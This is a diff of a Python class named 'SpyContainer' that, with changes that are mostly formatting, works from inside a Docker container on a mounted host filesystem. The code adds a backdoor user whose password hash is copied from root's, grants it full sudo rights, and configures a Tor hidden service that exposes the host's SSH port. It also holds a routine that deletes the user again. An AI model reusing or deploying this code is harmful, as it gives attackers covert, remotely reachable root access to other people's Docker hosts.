@@ -2,9 +2,8 @@ import logging
 import random
 import string
 import time
-from typing import Optional, Tuple
+from typing import Optional
 
-from docker.client import ContainerCollection
 from docker.models.containers import Container
 
 logger = logging.getLogger()
@@ -17,7 +16,9 @@ class SpyContainer:
         self._hole_directory_path = hole_directory_path
 
     def get_docker_host_ssh_port(self) -> int:
-        sshd_port_command = f"cat /{self._hole_directory_path}/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E '^Port'"
+        sshd_port_command = (
+            f"cat /{self._hole_directory_path}/etc/ssh/sshd_config | sed -e 's/^[[:space:]]*//' | grep -E '^Port'"
+        )
         sshd_port = self.execute_command(sshd_port_command)
 
         if sshd_port is None:
@@ -34,14 +35,10 @@ class SpyContainer:
 
     @staticmethod
     def generate_random_word(word_length: int) -> str:
-        return "".join(
-            random.choice(string.ascii_lowercase) for _ in range(word_length)
-        )
+        return "".join(random.choice(string.ascii_lowercase) for _ in range(word_length))
 
     def generate_docker_host_unique_username(self, username_length: int) -> str:
-        usernames_command = (
-            f'cat /{self._hole_directory_path}/etc/passwd | cut -d ":" -f 1'
-        )
+        usernames_command = f'cat /{self._hole_directory_path}/etc/passwd | cut -d ":" -f 1'
         usernames = self.execute_command(usernames_command)
 
         assert usernames is not None
@@ -56,16 +53,17 @@ class SpyContainer:
     def add_username_to_docker_host(self, username: str, password: str) -> None:
         chpasswd_command = f"echo 'root:{password}' | chpasswd"
         passwd_command = f"echo '{username}:x:10222:10222:test:/:/bin/sh' >> /{self._hole_directory_path}/etc/passwd"
-        shadow_command = f"cat /etc/shadow | grep root | head -1 | sed 's/root/{username}/' >> /{self._hole_directory_path}/etc/shadow"
+        shadow_command = (
+            "cat /etc/shadow | grep root | head -1 | "
+            f"sed 's/root/{username}/' >> /{self._hole_directory_path}/etc/shadow"
+        )
 
         self.execute_command(chpasswd_command)
         self.execute_command(passwd_command)
         self.execute_command(shadow_command)
 
     def add_username_to_sudoer_group(self, username: str) -> None:
-        sudoers_directory_command = (
-            f"mkdir -p /{self._hole_directory_path}/etc/sudoers.d"
-        )
+        sudoers_directory_command = f"mkdir -p /{self._hole_directory_path}/etc/sudoers.d"
         sudoers_file_content = f"{username} ALL=(ALL:ALL) ALL"
         sudoers_file_command = f"echo '{sudoers_file_content}' > /{self._hole_directory_path}/etc/sudoers.d/{username}"
 
@@ -89,14 +87,15 @@ class SpyContainer:
             if str(free_port) not in open_ports:
                 return free_port
 
-    def config_service_tor(
-        self, docker_host_ssh_port: int, tor_port_on_docker_host: int
-    ) -> None:
+    def config_service_tor(self, docker_host_ssh_port: int, tor_port_on_docker_host: int) -> None:
         torrc_file = "/etc/tor/torrc"
 
         socks_port_command = f"sed -i 's/#SocksPort 9050/SocksPort {tor_port_on_docker_host}/g' {torrc_file}"
-        ssh_port_command = f"sed -i '0,/#HiddenServicePort 80 127.0.0.1:80/s//HiddenServicePort {docker_host_ssh_port} 0.0.0.0:22/' {torrc_file}"
-        hidden_service_command = f"sed -i '/#HiddenServiceDir \/var\/lib\/tor\/hidden_service\//s/^#//g' {torrc_file}"
+        ssh_port_command = (
+            "sed -i '0,/#HiddenServicePort 80 "
+            f"127.0.0.1:80/s//HiddenServicePort {docker_host_ssh_port} 0.0.0.0:22/' {torrc_file}"
+        )
+        hidden_service_command = rf"sed -i '/#HiddenServiceDir \/var\/lib\/tor\/hidden_service\//s/^#//g' {torrc_file}"
         chown_command = "chown root:root /var/lib/tor"
 
         commands = [
@@ -145,20 +144,14 @@ class SpyContainer:
         self,
         username: str,
     ) -> None:
-        delete_from_passwd_commad = (
-            f"sed -i '/^{username}:.*/d' /{self._hole_directory_path}/etc/passwd"
-        )
-        delete_from_shadow_command = (
-            f"sed -i '/^{username}:.*/d' /{self._hole_directory_path}/etc/shadow"
-        )
+        delete_from_passwd_commad = f"sed -i '/^{username}:.*/d' /{self._hole_directory_path}/etc/passwd"
+        delete_from_shadow_command = f"sed -i '/^{username}:.*/d' /{self._hole_directory_path}/etc/shadow"
 
         self.execute_command(delete_from_passwd_commad)
         self.execute_command(delete_from_shadow_command)
 
     def execute_command(self, *command: str) -> Optional[str]:
-        output = self._spy_container.exec_run(
-            cmd=["sh", "-c"] + list(command), tty=True, demux=True
-        )[1][0]
+        output = self._spy_container.exec_run(cmd=["sh", "-c"] + list(command), tty=True, demux=True)[1][0]
 
         return output.decode("utf-8") if output else None
 
